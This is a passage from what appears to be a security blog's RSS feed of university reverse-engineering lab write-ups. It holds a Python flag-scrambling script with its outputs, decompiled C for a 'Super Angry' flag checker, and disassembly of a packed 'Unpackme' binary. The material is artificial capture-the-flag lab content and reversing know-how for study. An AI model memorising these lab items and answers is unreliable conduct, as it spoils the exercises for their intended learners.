&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> operation &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_value &lt;span style="color:#f92672">=&lt;/span> random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">1&lt;/span>, max_add_sub)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> operation &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> add_value &lt;span style="color:#f92672">=&lt;/span> random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">1&lt;/span>, max_add_sub)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scramble_pattern&lt;span style="color:#f92672">.&lt;/span>append((&lt;span style="color:#e6db74">&amp;#39;add&amp;#39;&lt;/span>, add_value))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> operation &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_value &lt;span style="color:#f92672">=&lt;/span> random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">1&lt;/span>, max_add_sub)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scramble_pattern&lt;span style="color:#f92672">.&lt;/span>append((&lt;span style="color:#e6db74">&amp;#39;sub&amp;#39;&lt;/span>, sub_value))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> operation &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shift_value &lt;span style="color:#f92672">=&lt;/span> random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">1&lt;/span>, max_shift)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scramble_pattern&lt;span style="color:#f92672">.&lt;/span>append((&lt;span style="color:#e6db74">&amp;#39;lsh&amp;#39;&lt;/span>, shift_value))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> scramble_pattern
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">apply_scramble_pattern&lt;/span>(input_bytes, patterns):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i, operations &lt;span style="color:#f92672">in&lt;/span> enumerate(patterns):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> src &lt;span style="color:#f92672">=&lt;/span> input_bytes[i]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> operation &lt;span style="color:#f92672">in&lt;/span> operations:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> operation &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> operation[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;add&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> src &lt;span style="color:#f92672">+=&lt;/span> operation[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> operation[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;sub&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> src &lt;span style="color:#f92672">-=&lt;/span> operation[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> operation[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;lsh&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> src &lt;span style="color:#f92672">&amp;lt;&amp;lt;=&lt;/span> operation[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> src &lt;span style="color:#f92672">&amp;amp;=&lt;/span> &lt;span style="color:#ae81ff">0xffffffff&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result&lt;span style="color:#f92672">.&lt;/span>append(src)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>k_FLAG &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;FLAG&lt;/span>&lt;span style="color:#e6db74">{REDACTED}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>patterns &lt;span style="color:#f92672">=&lt;/span> [generate_scramble_pattern(&lt;span style="color:#ae81ff">6&lt;/span>, max_shift&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>, max_add_sub&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0xffff&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(k_FLAG)) ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>scrambled_result &lt;span style="color:#f92672">=&lt;/span> apply_scramble_pattern(k_FLAG, patterns)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#34;Input Bytes:&amp;#34;&lt;/span>, k_FLAG, len(k_FLAG))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># REDACTED, 42&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#34;Scramble Pattern:&amp;#34;&lt;/span>, patterns)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># [[(&amp;#39;sub&amp;#39;, 20935)], [(&amp;#39;sub&amp;#39;, 31575), (&amp;#39;lsh&amp;#39;, 9), (&amp;#39;add&amp;#39;, 45363), (&amp;#39;add&amp;#39;, 35372), (&amp;#39;sub&amp;#39;, 15465)], [(&amp;#39;add&amp;#39;, 19123), (&amp;#39;add&amp;#39;, 35260), (&amp;#39;sub&amp;#39;, 49421), (&amp;#39;lsh&amp;#39;, 8)], [(&amp;#39;lsh&amp;#39;, 1), (&amp;#39;sub&amp;#39;, 4977), (&amp;#39;sub&amp;#39;, 55837)], [(&amp;#39;add&amp;#39;, 16937)], [(&amp;#39;sub&amp;#39;, 56984), (&amp;#39;lsh&amp;#39;, 2), (&amp;#39;sub&amp;#39;, 32363), (&amp;#39;sub&amp;#39;, 46293)], [(&amp;#39;sub&amp;#39;, 94), (&amp;#39;sub&amp;#39;, 48860), (&amp;#39;sub&amp;#39;, 18342), (&amp;#39;lsh&amp;#39;, 3)], [(&amp;#39;add&amp;#39;, 37549), (&amp;#39;sub&amp;#39;, 36283), (&amp;#39;lsh&amp;#39;, 6), (&amp;#39;add&amp;#39;, 6253)], [(&amp;#39;add&amp;#39;, 34661), (&amp;#39;sub&amp;#39;, 13281), (&amp;#39;sub&amp;#39;, 64107)], [(&amp;#39;sub&amp;#39;, 8525), (&amp;#39;sub&amp;#39;, 30349), (&amp;#39;sub&amp;#39;, 26744)], [(&amp;#39;lsh&amp;#39;, 2), (&amp;#39;sub&amp;#39;, 18120), (&amp;#39;sub&amp;#39;, 63091), (&amp;#39;add&amp;#39;, 17287), (&amp;#39;sub&amp;#39;, 37618), (&amp;#39;add&amp;#39;, 2237)], [(&amp;#39;sub&amp;#39;, 48573), (&amp;#39;sub&amp;#39;, 4449), (&amp;#39;add&amp;#39;, 36013), (&amp;#39;sub&amp;#39;, 64051)], [(&amp;#39;add&amp;#39;, 10415), (&amp;#39;lsh&amp;#39;, 3), (&amp;#39;lsh&amp;#39;, 10)], [(&amp;#39;add&amp;#39;, 5676), (&amp;#39;lsh&amp;#39;, 3), (&amp;#39;lsh&amp;#39;, 10), (&amp;#39;add&amp;#39;, 32002), (&amp;#39;sub&amp;#39;, 60775)], [(&amp;#39;add&amp;#39;, 35939), (&amp;#39;sub&amp;#39;, 32666), (&amp;#39;sub&amp;#39;, 45639), (&amp;#39;add&amp;#39;, 2077), (&amp;#39;sub&amp;#39;, 16253)], [(&amp;#39;sub&amp;#39;, 30392), (&amp;#39;sub&amp;#39;, 26913), (&amp;#39;sub&amp;#39;, 14009), (&amp;#39;sub&amp;#39;, 62416)], [(&amp;#39;sub&amp;#39;, 15056), (&amp;#39;sub&amp;#39;, 40527)], [(&amp;#39;lsh&amp;#39;, 5)], [(&amp;#39;lsh&amp;#39;, 1), (&amp;#39;sub&amp;#39;, 16070)], [(&amp;#39;add&amp;#39;, 2045)], [(&amp;#39;lsh&amp;#39;, 8), (&amp;#39;add&amp;#39;, 37087), (&amp;#39;sub&amp;#39;, 22013), (&amp;#39;lsh&amp;#39;, 10), (&amp;#39;lsh&amp;#39;, 2)], [(&amp;#39;add&amp;#39;, 31880), (&amp;#39;sub&amp;#39;, 56557), (&amp;#39;lsh&amp;#39;, 6), (&amp;#39;lsh&amp;#39;, 5), (&amp;#39;lsh&amp;#39;, 8), (&amp;#39;add&amp;#39;, 15535)], [(&amp;#39;add&amp;#39;, 22937), (&amp;#39;add&amp;#39;, 4060)], [(&amp;#39;add&amp;#39;, 8462), (&amp;#39;sub&amp;#39;, 4463), (&amp;#39;sub&amp;#39;, 45810), (&amp;#39;lsh&amp;#39;, 1)], [(&amp;#39;sub&amp;#39;, 10144), (&amp;#39;lsh&amp;#39;, 8), (&amp;#39;lsh&amp;#39;, 5), (&amp;#39;lsh&amp;#39;, 1), (&amp;#39;lsh&amp;#39;, 8)], [(&amp;#39;add&amp;#39;, 49937), (&amp;#39;lsh&amp;#39;, 2), (&amp;#39;add&amp;#39;, 60982), (&amp;#39;sub&amp;#39;, 24799)], [(&amp;#39;lsh&amp;#39;, 4), (&amp;#39;add&amp;#39;, 53340), (&amp;#39;add&amp;#39;, 50619), (&amp;#39;sub&amp;#39;, 56111), (&amp;#39;add&amp;#39;, 6134), (&amp;#39;lsh&amp;#39;, 1)], [(&amp;#39;sub&amp;#39;, 22577), (&amp;#39;sub&amp;#39;, 50645)], [(&amp;#39;add&amp;#39;, 21265), (&amp;#39;sub&amp;#39;, 41440)], [(&amp;#39;add&amp;#39;, 63314), (&amp;#39;sub&amp;#39;, 45755), (&amp;#39;add&amp;#39;, 62216)], [(&amp;#39;sub&amp;#39;, 52616)], [(&amp;#39;add&amp;#39;, 21192)], [(&amp;#39;add&amp;#39;, 62573), (&amp;#39;sub&amp;#39;,18811)], [(&amp;#39;add&amp;#39;, 35452), (&amp;#39;sub&amp;#39;, 11573), (&amp;#39;sub&amp;#39;, 49079), (&amp;#39;sub&amp;#39;, 36361), (&amp;#39;sub&amp;#39;, 26862), (&amp;#39;lsh&amp;#39;, 9)], [(&amp;#39;add&amp;#39;, 13610), (&amp;#39;lsh&amp;#39;, 7), (&amp;#39;lsh&amp;#39;, 3), (&amp;#39;sub&amp;#39;, 28490), (&amp;#39;lsh&amp;#39;, 10), (&amp;#39;add&amp;#39;, 44742)], [(&amp;#39;lsh&amp;#39;, 10), (&amp;#39;sub&amp;#39;, 1797), (&amp;#39;sub&amp;#39;, 10564), (&amp;#39;add&amp;#39;, 12394)], [(&amp;#39;add&amp;#39;, 45165), (&amp;#39;lsh&amp;#39;, 10), (&amp;#39;sub&amp;#39;, 60610), (&amp;#39;sub&amp;#39;, 63002), (&amp;#39;sub&amp;#39;, 14851), (&amp;#39;lsh&amp;#39;, 1)], [(&amp;#39;add&amp;#39;, 34840), (&amp;#39;lsh&amp;#39;, 3), (&amp;#39;sub&amp;#39;, 16907)], [(&amp;#39;add&amp;#39;, 4404), (&amp;#39;lsh&amp;#39;, 3), (&amp;#39;lsh&amp;#39;, 7), (&amp;#39;lsh&amp;#39;, 6)], [(&amp;#39;lsh&amp;#39;, 6), (&amp;#39;add&amp;#39;, 51738), (&amp;#39;sub&amp;#39;, 24621), (&amp;#39;add&amp;#39;, 58646)], [(&amp;#39;lsh&amp;#39;, 1)], [(&amp;#39;add&amp;#39;, 29375), (&amp;#39;sub&amp;#39;, 419), (&amp;#39;add&amp;#39;, 2854), (&amp;#39;sub&amp;#39;, 11878), (&amp;#39;lsh&amp;#39;, 10), (&amp;#39;add&amp;#39;, 40151)], [(&amp;#39;add&amp;#39;, 22953)]]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#34;Scrambled Result:&amp;#34;&lt;/span>, scrambled_result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># [4294946431, 4278905078, 1286912, 4294906624, 17060, 4294661164, 4294429720, 94573, 4294924666, 4294901787, 4294868383, 4294886344, 86147072, 47247259, 4294910851, 4294833676, 4294911813, 3040, 4294951460, 2160, 171843584, 4734127, 27100, 4294883864, 884998144, 236375, 111420, 4294894192, 4294947222, 79889, 4294914775, 21308, 43873, 4249743360, 1477674694, 113697, 92442178, 262757, 295239680, 91843, 210, 20569303, 23078]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler output.txt&lt;/p></description></item><item><title>Simple Reverse - 0x28(2023 Lab - Super Angry)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x282023-lab---super-angry/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x282023-lab---super-angry/</guid><description>&lt;h1 id="simple-reverse---0x282023-lab---super-angry">
 Simple Reverse - 0x28(2023 Lab - Super Angry)
 &lt;a class="anchor" href="#simple-reverse---0x282023-lab---super-angry">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler main function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#f92672">*&lt;/span>user_input; &lt;span style="color:#75715e">// rcx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v5; &lt;span style="color:#75715e">// rdx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v6; &lt;span style="color:#75715e">// rdx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> output[&lt;span style="color:#ae81ff">128&lt;/span>]; &lt;span style="color:#75715e">// [rsp+10h] [rbp-B0h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> user_input_cp[&lt;span style="color:#ae81ff">6&lt;/span>]; &lt;span style="color:#75715e">// [rsp+90h] [rbp-30h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_input_cp[&lt;span style="color:#ae81ff">5&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> __readfsqword(&lt;span style="color:#ae81ff">0x28u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( argc &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_input &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)argv[&lt;span style="color:#ae81ff">1&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> user_input[&lt;span style="color:#ae81ff">1&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_input_cp[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>user_input;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_input_cp[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> v5;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> user_input[&lt;span style="color:#ae81ff">3&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_input_cp[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> user_input[&lt;span style="color:#ae81ff">2&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_input_cp[&lt;span style="color:#ae81ff">3&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> v6;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scramble_fn((&lt;span style="color:#66d9ef">__int64&lt;/span>)user_input_cp, output, &lt;span style="color:#ae81ff">0x20uLL&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>memcmp(output, verify_key, &lt;span style="color:#ae81ff">0x80uLL&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Correct!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Incorrect!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0LL&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;Usage: %s &amp;lt;input&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, &lt;span style="color:#f92672">*&lt;/span>argv);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1LL&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse - 0x29(2023 Lab - Unpackme)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x292023-lab---unpackme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x292023-lab---unpackme/</guid><description>&lt;h1 id="simple-reverse---0x292023-lab---unpackme">
 Simple Reverse - 0x29(2023 Lab - Unpackme)
 &lt;a class="anchor" href="#simple-reverse---0x292023-lab---unpackme">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AE8 mov rdi, [rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>h&lt;span style="color:#f92672">+&lt;/span>start] ; start
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AED push &lt;span style="color:#ae81ff">5&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AEF pop rdx ; prot
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF0 push &lt;span style="color:#ae81ff">0&lt;/span>Ah
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF2 pop rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF3 syscall ; LINUX &lt;span style="color:#f92672">-&lt;/span> sys_mprotect
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF5 jmp r13
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF5
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF5 sub_5A7C endp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF5
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF8 ; &lt;span style="color:#f92672">---------------------------------------------------------------------------&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF8 loc_5AF8: ; CODE XREF: start&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">↑&lt;/span>p
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF8 pop rbp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF9 call sub_5A7C
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF9
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF9 ; &lt;span style="color:#f92672">---------------------------------------------------------------------------&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AFE aProcSelfExe db &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>&lt;span style="color:#f92672">/&lt;/span>proc&lt;span style="color:#f92672">/&lt;/span>self&lt;span style="color:#f92672">/&lt;/span>exe&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>B0D align &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>B0E dw &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>B10 dq &lt;span style="color:#ae81ff">81&lt;/span>B00000C1100h, &lt;span style="color:#ae81ff">0FF&lt;/span>FFFF0000000200h, &lt;span style="color:#ae81ff">7549F&lt;/span>&lt;span style="color:#ae81ff">983004&lt;/span>AE8E5h, &lt;span style="color:#ae81ff">0F&lt;/span>D374C8D48575344h, &lt;span style="color:#ae81ff">0&lt;/span>CE39482FEB5B565Eh, &lt;span style="color:#ae81ff">0FF&lt;/span>FFFBFF5E563273h
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>B10 dq &lt;span style="color:#ae81ff">778F&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>C0A72803CACh, &lt;span style="color:#ae81ff">2&lt;/span>C06740FFE7E8006h, &lt;span style="color:#ae81ff">56161&lt;/span>BE477013CE8h, &lt;span style="color:#ae81ff">0FF&lt;/span>BFFFFF75D028ADh, &lt;span style="color:#ae81ff">0&lt;/span>D801F829C80F5FDFh, &lt;span style="color:#ae81ff">0&lt;/span>C35BDFEBAC0312ABh
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>B10 dq &lt;span style="color:#ae81ff">8948505741564158&lt;/span>h, &lt;span style="color:#ae81ff">0&lt;/span>DBFFEDFEEC8148E6h, &lt;span style="color:#ae81ff">590&lt;/span>A6A5F54591000h, &lt;span style="color:#ae81ff">5003E8348&lt;/span>A548F3h, &lt;span style="color:#ae81ff">0&lt;/span>B6AB48FE8949F875h, &lt;span style="color:#ae81ff">0F&lt;/span>&lt;span style="color:#ae81ff">60&lt;/span>C0AFC0CCBB374h
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>B10 dq &lt;span style="color:#ae81ff">4&lt;/span>DF5FF6EDFFE02FFh, &lt;span style="color:#ae81ff">5E57370&lt;/span>FFFBAFC29h, &lt;span style="color:#ae81ff">50F&lt;/span>&lt;span style="color:#ae81ff">58596&lt;/span>AED7B8Ch, &lt;span style="color:#ae81ff">0&lt;/span>DFFF6FDB0579C085h, &lt;span style="color:#ae81ff">8&lt;/span>D49FD91580F6A0Eh, &lt;span style="color:#ae81ff">0E741&lt;/span>AAA00B0FF7Dh
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
